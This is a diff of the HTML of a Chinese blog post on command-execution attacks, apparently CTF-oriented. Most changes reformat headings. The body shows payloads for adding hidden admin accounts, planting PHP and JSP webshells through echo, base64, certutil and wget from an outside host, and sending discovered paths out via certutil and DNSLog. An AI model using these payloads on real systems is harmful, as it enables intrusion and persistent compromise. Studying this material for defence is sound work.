@@ -11,7 +11,7 @@
   <meta itemprop="name" content="代码执行|命令执行">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="783">
+  <meta itemprop="wordCount" content="748">
   <meta itemprop="keywords" content="OWASP,命令执行"><meta property="og:url" content="https://dongyu29.github.io/posts/owasp/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/109/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="代码执行|命令执行">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\/109\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, 命令执行","wordcount":  783 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, 命令执行","wordcount":  748 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\/109\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>代码执行|命令执行</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="783 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>4 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="748 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>4 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,27 +152,52 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#出网">出网</a></li>
+    <li><a href="#不出网">不出网</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#判断">判断</a></li>
+    <li><a href="#利用">利用</a>
       <ul>
-        <li></li>
+        <li><a href="#直接拿flag">直接拿flag</a></li>
+        <li><a href="#拿shell">拿shell</a></li>
       </ul>
     </li>
+    <li><a href="#无回显不出网">无回显不出网</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#取反">取反</a></li>
+    <li><a href="#异或">异或</a></li>
+    <li><a href="#自增">自增</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#拼接">拼接</a></li>
+    <li><a href="#base64编码">base64编码</a></li>
+    <li><a href="#单引号双引号">单引号、双引号</a></li>
+    <li><a href="#反斜线">反斜线</a></li>
+    <li><a href="#ifs">${IFS}</a></li>
+    <li><a href="#重定向符">重定向符&lt;&gt;</a></li>
+    <li><a href="#利用已存在的资源">利用已存在的资源</a></li>
+    <li><a href="#管道符命令分隔符">管道符&amp;命令分隔符</a></li>
   </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="判断目标操作系统" class="heading-element"><span>0.0.0.1  判断目标操作系统</span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="判断目标操作系统" class="heading-element"><span>判断目标操作系统</span>
   <a href="#%e5%88%a4%e6%96%ad%e7%9b%ae%e6%a0%87%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>对于有回显/出网的情况就很好判断了。</p>
+</h1><p>对于有回显/出网的情况就很好判断了。</p>
 <p>这里介绍无回显不出网情况下的判断方法：</p>
 <p>Ping命令在Linux和Win中的参数不同，“要发送的回显请求数”  在Linux中为<code>-c</code>参数，Win中为<code>-n</code>参数</p>
 <p>Windows下的Ping命令每间隔一秒会发送一个ICMP ECHO_REQUEST 包，因此可以利用 Ping 命令来近似地模拟等待指定秒数的效果</p>
 <p>应该目标通过 <code>ping -n</code>产生了相应的延时，则说明是Windows系统，反则Linux系统</p>
-<h5 id="代码命令执行函数" class="heading-element"><span>0.0.0.2  代码&amp;命令执行函数</span>
+<h1 id="代码命令执行函数" class="heading-element"><span>代码&amp;命令执行函数</span>
   <a href="#%e4%bb%a3%e7%a0%81%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e5%87%bd%e6%95%b0" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><blockquote>
+</h1><blockquote>
 <p>可以代码&amp;命令执行的函数有很多，有可以回显的，也有不回显的。</p>
 </blockquote>
 <table>
@@ -246,25 +271,25 @@
 </tr>
 </tbody>
 </table>
-<h5 id="有回显命令执行" class="heading-element"><span>0.0.0.3  有回显命令执行</span>
+<h1 id="有回显命令执行" class="heading-element"><span>有回显命令执行</span>
   <a href="#%e6%9c%89%e5%9b%9e%e6%98%be%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="出网" class="heading-element"><span>0.0.0.3.1  出网</span>
+</h1><h2 id="出网" class="heading-element"><span>出网</span>
   <a href="#%e5%87%ba%e7%bd%91" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>如果目标开放远程桌面端口的话，并且权限足够可以直接执行命令添加账号</p>
+</h2><p>如果目标开放远程桌面端口的话，并且权限足够可以直接执行命令添加账号</p>
 <pre tabindex="0"><code>net user test test@123qaz /add
 net localgroup administrators test /add
 或者启用guest账号：
 net user guest /active:yes
 net user guest guest@123qaz
-net localgroup administrators guest /add</code></pre><h6 id="不出网" class="heading-element"><span>0.0.0.3.2  不出网</span>
+net localgroup administrators guest /add</code></pre><h2 id="不出网" class="heading-element"><span>不出网</span>
   <a href="#%e4%b8%8d%e5%87%ba%e7%bd%91" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>针对这种场景，解决方法就比较灵活了。因为不通外网，所以主思路还是想办法写入webshell。</p>
+</h2><p>针对这种场景，解决方法就比较灵活了。因为不通外网，所以主思路还是想办法写入webshell。</p>
 <p>1.确认Web应用物理路径</p>
 <pre tabindex="0"><code>dir /s/a-d/b /WEB-INF/web.xml
 或者
@@ -272,15 +297,15 @@ for /r c: %i in (checkCode.js*) do @echo %i</code></pre><p>2.写入webshell，�
 <p>3.使用certutil解码</p>
 <pre tabindex="0"><code>certutil -decode D:\OA\apache-tomcat-7.0.91\webapps\ROOT\shell.txt D:\OA\apache-tomcat-7.0.91\webapps\ROOT\shell.jsp</code></pre><p>linux</p>
 <pre tabindex="0"><code>find . -type f -name yokan_test.js|while read f;do echo $f &gt;$(dirname $f)/test.txt;done
-echo webshell的base64编码内容 |base64 -d &gt; Web应用目录/test.jsp  </code></pre><h5 id="无回显命令执行" class="heading-element"><span>0.0.0.4  无回显命令执行</span>
+echo webshell的base64编码内容 |base64 -d &gt; Web应用目录/test.jsp  </code></pre><h1 id="无回显命令执行" class="heading-element"><span>无回显命令执行</span>
   <a href="#%e6%97%a0%e5%9b%9e%e6%98%be%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="判断" class="heading-element"><span>0.0.0.4.1  判断</span>
+</h1><h2 id="判断" class="heading-element"><span>判断</span>
   <a href="#%e5%88%a4%e6%96%ad" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</h2><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">highlight_file</span>(<span style="color:#58a1dd">__FILE__</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span>(<span style="color:#58a1dd">issert</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;cmd&#39;</span>])){
 </span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">shell_exec</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;cmd&#39;</span>]);
@@ -303,12 +328,15 @@ echo webshell的base64编码内容 |base64 -d &gt; Web应用目录/test.jsp  </c
 <p>?cmd=ping 9y8y3k.dnslog.cn</p>
 </li>
 </ol>
-<h6 id="利用" class="heading-element"><span>0.0.0.4.2  利用</span>
+<h2 id="利用" class="heading-element"><span>利用</span>
   <a href="#%e5%88%a9%e7%94%a8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>####### 直接拿flag</p>
-<ol>
+</h2><h3 id="直接拿flag" class="heading-element"><span>直接拿flag</span>
+  <a href="#%e7%9b%b4%e6%8e%a5%e6%8b%bfflag" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ol>
 <li>
 <p>使用<code>&gt;</code>或<code>&gt;&gt;</code></p>
 <blockquote>
@@ -354,15 +382,27 @@ echo webshell的base64编码内容 |base64 -d &gt; Web应用目录/test.jsp  </c
 </blockquote>
 </li>
 </ol>
-<p>####### 拿shell</p>
-<p>######## 判断web路径</p>
-<p><strong>第一，利用特殊的文件定位Web路径并将路径写入特殊文件同目录下的txt文件</strong></p>
+<h3 id="拿shell" class="heading-element"><span>拿shell</span>
+  <a href="#%e6%8b%bfshell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="判断web路径" class="heading-element"><span>判断web路径</span>
+  <a href="#%e5%88%a4%e6%96%adweb%e8%b7%af%e5%be%84" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p><strong>第一，利用特殊的文件定位Web路径并将路径写入特殊文件同目录下的txt文件</strong></p>
 <p>这里以 yokan_test.js 为例：</p>
 <pre tabindex="0"><code>for /f %i in (&#39;dir /x /s /b yokan_test.js&#39;) do (echo %i&gt;%i.path.txt)</code></pre><p><strong>第二，利用特殊的文件定位Web路径并将结果发送至DNSLog</strong></p>
 <pre tabindex="0"><code>for /r c: %i in (yokan_test.js*) do certutil -urlcache -split -f http://x.x.x.x/%i</code></pre><p>当然，可以发送路径，也可以直接执行命令</p>
-<pre tabindex="0"><code>for /f %i in (&#39;dir /x /s /b yokan_test.js&#39;) do (ipconfig &gt;%i.ipconfig.txt)</code></pre><p>######## 正向shell</p>
-<p>######### 无字符数量限制</p>
-<ul>
+<pre tabindex="0"><code>for /f %i in (&#39;dir /x /s /b yokan_test.js&#39;) do (ipconfig &gt;%i.ipconfig.txt)</code></pre><h4 id="正向shell" class="heading-element"><span>正向shell</span>
+  <a href="#%e6%ad%a3%e5%90%91shell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><h5 id="无字符数量限制" class="heading-element"><span>无字符数量限制</span>
+  <a href="#%e6%97%a0%e5%ad%97%e7%ac%a6%e6%95%b0%e9%87%8f%e9%99%90%e5%88%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><ul>
 <li>
 <p>直接写入</p>
 <pre tabindex="0"><code>?cmd=echo&#34;&lt;?php @eval(\$_POST[1]);?&gt;&#34; &gt; webshell.php</code></pre></li>
@@ -374,15 +414,21 @@ echo webshell的base64编码内容 |base64 -d &gt; Web应用目录/test.jsp  </c
 </li>
 </ul>
 <p>wget http://192.168.111.128/1.php -O webshell.php</p>
-<p>######### 有限字符限制</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+<h5 id="有限字符限制" class="heading-element"><span>有限字符限制</span>
+  <a href="#%e6%9c%89%e9%99%90%e5%ad%97%e7%ac%a6%e9%99%90%e5%88%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">highlight_file</span>(<span style="color:#58a1dd">__FILE__</span>);
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span>(<span style="color:#58a1dd">strlen</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">1</span>])<span style="color:#ff636f">&lt;</span><span style="color:#a6be9d">15</span>){
 </span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">shell_exec</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">1</span>]);
 </span></span><span style="display:flex;"><span>}<span style="color:#ff636f">else</span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#ff636f">exit</span>(<span style="color:#a6be9d">&#39;too long&#39;</span>);
-</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>########## 14位可控</p>
-<pre tabindex="0"><code>echo \&lt;?=@eval(\$_POST\[1\]\)\; &gt; 1;mv 1 1.php;jp</code></pre><blockquote>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h6 id="14位可控" class="heading-element"><span>14位可控</span>
+  <a href="#14%e4%bd%8d%e5%8f%af%e6%8e%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
